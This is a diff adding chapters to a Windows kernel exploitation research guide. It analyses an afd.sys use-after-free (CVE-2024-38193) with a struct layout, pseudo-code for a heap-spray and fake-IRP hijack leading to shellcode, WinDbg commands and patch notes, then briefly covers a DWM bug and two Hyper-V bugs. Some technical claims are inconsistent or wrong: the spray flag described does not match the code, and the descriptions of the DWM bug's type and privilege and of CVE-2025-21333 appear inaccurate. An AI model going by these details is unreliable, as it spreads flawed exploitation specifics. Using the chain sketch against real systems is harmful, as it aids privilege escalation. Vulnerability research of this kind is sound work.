+Loaded by default on all Windows systems.
+
+**Vulnerable function**: `AfdPollHandleTransportEndpointChange`
+
+**Vulnerable structure**: `_AFD_POLL_HANDLE_INFO`
+
+```c
+// _AFD_POLL_HANDLE_INFO layout (reverse-engineered from afd.sys)
+typedef struct _AFD_POLL_HANDLE_INFO {
+    HANDLE          Handle;           // +0x000: handle to transport endpoint
+    ULONG           Events;           // +0x008: poll event mask (AFD_POLL_*)
+    NTSTATUS        PollStatus;       // +0x00c: status of last poll event
+    PVOID           TransportEndpoint;// +0x010: pointer to transport endpoint object
+    LIST_ENTRY      PollHandleList;   // +0x018: linked list of poll handles
+    PIRP            PollIrp;          // +0x028: IRP for this poll request
+} AFD_POLL_HANDLE_INFO, *PAFD_POLL_HANDLE_INFO;
+```
+
+**Root cause — UAF in `AfdPollHandleTransportEndpointChange`**:
+
+`AfdPollHandleTransportEndpointChange` is a callback registered on transport endpoint
+state changes. When a polling operation is in flight and the associated transport endpoint
+is closed by a concurrent thread, a race condition occurs:
+
+1. Thread A: `AfdPoll` is called with endpoint E, allocating `AFD_POLL_HANDLE_INFO`
+   structure H in NonPagedPool. H's `TransportEndpoint` points to E.
+2. Thread B: Closes endpoint E. The endpoint object's reference count reaches zero.
+   `AfdDestroyTransportEndpoint` frees E and calls `AfdPollHandleTransportEndpointChange`
+   to notify pending poll operations.
+3. `AfdPollHandleTransportEndpointChange` walks the poll handle list. It reads
+   `H->PollHandleList.Flink` to find the next handle.
+4. **Race**: Between step 2 (E freed) and step 3 (list walk), Thread A's poll
+   completion path has already begun freeing H. If Thread A's `ExFreePoolWithTag(H)`
+   completes before step 3's list walk dereferences `H->PollHandleList.Flink`, the
+   list walk dereferences freed memory — a classic UAF.
+
+**Lazarus exploitation technique — kernel heap spray using `NtAllocateVirtualMemory`**:
+
+After the UAF frees `AFD_POLL_HANDLE_INFO` (typically 0x30 bytes in the NonPagedPool
+LFH bucket), Lazarus' exploit sprays the freed slot with a controlled structure. The
+spray technique is notable: instead of using standard kernel object spray primitives,
+the exploit uses `NtAllocateVirtualMemory` with `MEM_PHYSICAL` flag to allocate memory
+that is then mapped into kernel space via a crafted MDL.
+
+```c
+// Lazarus kernel heap spray technique (pseudo-code, from Avast/ESET analysis)
+
+// Step 1: Free AFD_POLL_HANDLE_INFO (trigger UAF)
+TriggerAFDRace(sock1, sock2);  // race condition frees the structure
+
+// Step 2: Spray freed 0x30-byte LFH slot
+// Lazarus uses NtAllocateVirtualMemory to allocate user pages at specific VAs
+// then creates an MDL mapping them into kernel NonPaged VA range
+PVOID userPage = NULL;
+SIZE_T regionSize = 0x1000;
+NtAllocateVirtualMemory(GetCurrentProcess(), &userPage, 0, &regionSize,
+                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+// Fill userPage with fake AFD_POLL_HANDLE_INFO
+// TransportEndpoint → fake endpoint object
+// PollHandleList.Flink → attacker-controlled address
+// PollIrp → fake IRP with crafted stack location
+
+// Step 3: Create MDL to map user page into kernel space
+// (requires a kernel write primitive from a prior step, or uses a separate primitive)
+// MDL maps userPage at the freed AFD_POLL_HANDLE_INFO's NonPaged VA
+
+// Step 4: Trigger use of freed pointer
+// AfdPollHandleTransportEndpointChange runs with the fake structure
+// Follows PollHandleList.Flink → controlled dereference
+// Follows PollIrp → IRP completion path → IoCompleteRequest on fake IRP
+// Fake IRP's CompletionRoutine → attacker shellcode/ROP
+```
+
+**WinDbg analysis commands for CVE-2024-38193 research**:
+
+```windbg
+; Load afd.sys symbols
+.reload /f afd.sys
+
+; Find AfdPollHandleTransportEndpointChange
+x afd!AfdPollHandleTransportEndpointChange
+
+; Set breakpoint on poll handle free path
+bp afd!AfdFreeRemotePollHandle
+
+; Inspect AFD_POLL_HANDLE_INFO at address
+dt afd!_AFD_POLL_HANDLE_INFO [addr]
+
+; Check LFH bucket for 0x30-byte allocations in afd.sys pool tag space
+!poolused 2 AFDp
+
+; Find AFD transport endpoint objects
+dt afd!_AFD_ENDPOINT [addr]
+; +0x000 Type              : Uint2B
+; +0x004 Size              : Uint2B
+; +0x008 ReferenceCount    : Int4B   ← watch for zero (freed endpoint)
+```
+
+**Patch analysis**:
+
+The patch (KB5041585, August 2024) adds a reference count check in
+`AfdPollHandleTransportEndpointChange` before dereferencing `AFD_POLL_HANDLE_INFO`.
+The poll handle's `ReferenceCount` is now checked before walking the list, and the
+walk is protected by a critical section that was absent in the vulnerable code:
+
+```c
+// Patched pseudo-code in AfdPollHandleTransportEndpointChange
+AfdAcquirePollLock(PollHandleInfo);  // ← new: acquire lock before list walk
+if (AfdIsPollHandleValid(PollHandleInfo)) {  // ← new: reference check
+    // ... original list walk ...
+}
+AfdReleasePollLock(PollHandleInfo);  // ← new: release after walk
+```
+
+### 10.11.3 CVE-2024-30051 — DWM Heap UAF (QakBot)
+
+**Driver/Component**: Desktop Window Manager (`dwm.exe` / kernel component `win32kfull.sys`
+session heap, DWM-specific allocation).
+
+**Attribution**: Used by the threat actor operating QakBot infrastructure. Kaspersky
+and DBAPPSecurity published analyses in May 2024.
+
+**Root cause**: A heap UAF in the DWM (Desktop Window Manager) compositor. The DWM
+runs as a privileged Windows service (`dwm.exe`) under `NT AUTHORITY\SYSTEM` + `Session`.
+The vulnerability is in the DWM's internal window composition queue.
+
+**Exploitation impact**: Elevating from a standard user to `SYSTEM` by hijacking the
+DWM process's execution context. DWM runs as SYSTEM with `SeDebugPrivilege` enabled,
+making it a high-value token theft target.
+
+**Key detail for researchers**: The DWM compositor uses a separate heap region in the
+session pool, not the standard NonPagedPool. Bugs in DWM's session heap are distinct
+from standard kernel pool bugs — they run in a different pool region with slightly
+different Segment Heap metadata layout.
+
+### 10.11.4 CVE-2025-21333 / CVE-2025-21335 — Hyper-V Escape
+
+Two in-the-wild Hyper-V kernel exploits patched in the January 2025 Patch Tuesday
+represent a significant escalation in exploitation target sophistication.
+
+**CVE-2025-21333 — Hyper-V NTFS guest escape**:
+
+- **Target**: Guest NTFS driver (`ntfs.sys`) as seen from inside a Hyper-V guest VM
+- **Method**: A vulnerability in the guest's NTFS driver processing of file system
+  operations that cross the Hyper-V synthetic storage boundary
+- **Impact**: Guest → Host SYSTEM. The attack escapes from the VM guest context to
+  execute code in the host kernel (the Hyper-V root partition)
+- **Significance**: Guest-to-host escape via a Windows file system driver (not the
+  hypervisor itself) demonstrates the attack surface extends beyond the VMBus and
+  VSP/VSC interfaces
+
+**CVE-2025-21335 — Hyper-V VSP UAF**:
+
+- **Target**: Hyper-V Virtual Service Provider (VSP) — the host-side component of
+  synthetic device emulation
+- **Method**: UAF in the VSP layer when handling a guest-initiated disconnect/reconnect
+  race on a synthetic network or storage device
+- **Impact**: Guest → Host SYSTEM via VSP code running in the root partition kernel
+
+**Research implications**: Hyper-V escape research requires access to the Hyper-V
+VSP/VSC interface, which is documented only partially. Key analysis tools:
+
+```windbg
+; On Hyper-V host (root partition):
+; List Hyper-V VSP objects
+lm m hvax64        ; Hyper-V hypervisor extension
+lm m vmbus         ; VMBus driver
+lm m storvsp       ; Storage VSP
+lm m netvsp        ; Network VSP
+
+; VSP IRP dispatch (storvsp example)
+x storvsp!*Dispatch*
+
+; VMBus channel structures
+dt vmbus!_VMBUS_CHANNEL [addr]
+```
+
 ---
 
 ## References
@@ -758,3 +1599,24 @@ exploitation methodology.
 
 [R-8] Vergilius Project — Windows kernel structure definitions by build
   — https://www.vergiliusproject.com/
+
+[R-9] FudModule v2: A Deep Dive into CVE-2024-21338
+  — Avast Threat Research — https://decoded.avast.io/
+
+[R-10] CVE-2024-38193: Lazarus Group Exploits AFD.sys UAF
+  — ESET Research / Avast — https://www.welivesecurity.com/
+
+[R-11] CVE-2024-30051: Desktop Window Manager UAF Used by QakBot
+  — Kaspersky SecureList, DBAPPSecurity — https://securelist.com/
+
+[R-12] Windows 11 24H2 Segment Heap Hardening Analysis
+  — Vergilius Project build 26100 structures — https://www.vergiliusproject.com/kernels/x64/Windows%2011%2024H2
+
+[R-13] HEVD v3.x ARM64 Support and New Vulnerability Classes
+  — HackSysTeam — https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases
+
+[R-14] Pool Party Variants Viability Analysis Post-24H2
+  — SafeBreach Labs — https://www.safebreach.com/
+
+[R-15] NtQuerySystemInformation Class Audit 2024
+  — j00ru Kernel Exploitation Blog — https://j00ru.vexillium.org/
